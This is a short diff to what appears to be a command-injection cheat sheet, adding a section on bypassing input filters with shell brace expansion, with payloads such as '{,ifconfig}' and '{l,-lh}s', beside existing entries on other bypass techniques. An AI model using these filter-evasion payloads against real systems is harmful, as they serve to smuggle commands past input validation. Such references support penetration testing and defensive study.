@@ -16,6 +16,7 @@
   * [Bypass with backslash newline](#bypass-with-backslash-newline)
   * [Bypass characters filter via hex encoding](#bypass-characters-filter-via-hex-encoding)
   * [Bypass with Tilde expansion](#bypass-with-tilde-expansion)
+  * [Bypass with Brace expansion](#bypass-with-brace-expansion)
   * [Bypass characters filter](#bypass-characters-filter)
   * [Bypass blacklisted words](#bypass-blacklisted-words)
    * [Bypass with single quote](#bypass-with-single-quote)
@@ -225,6 +226,16 @@ root:x:0:0:root:/root:/bin/bash
 echo ~+
 echo ~-
 ```
+
+### Bypass with Brace expansion
+
+```powershell
+{,ip,a}
+{,ifconfig}
+{,ifconfig,eth0}
+{l,-lh}s
+```
+
 
 ### Bypass characters filter
 
